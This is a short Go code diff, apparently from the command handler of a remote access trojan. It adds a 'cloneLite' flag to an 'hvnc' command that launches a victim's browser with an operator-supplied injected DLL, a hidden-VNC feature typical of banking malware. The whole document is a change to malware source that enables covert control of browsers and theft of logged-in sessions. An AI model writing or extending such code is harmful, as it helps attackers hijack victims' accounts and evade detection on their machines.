@@ -1339,6 +1339,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		browser := ""
 		exePath := ""
 		clone := true
+		cloneLite := false
 		if payload != nil {
 			if v, ok := payload["browser"].(string); ok {
 				browser = v
@@ -1348,6 +1349,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 			if v, ok := payload["clone"].(bool); ok {
 				clone = v
+			}
+			if v, ok := payload["cloneLite"].(bool); ok {
+				cloneLite = v
 			}
 		}
 		dllBytes := extractDLLBytes(payload)
@@ -1359,10 +1363,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no browser specified")
 			return nil
 		}
-		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v dllSize=%d", browser, exePath, clone, len(dllBytes))
+		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v cloneLite=%v dllSize=%d", browser, exePath, clone, cloneLite, len(dllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_browser_injected", nil, func() {
-			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, clone); err != nil {
+			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, clone, cloneLite); err != nil {
 				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
 		})
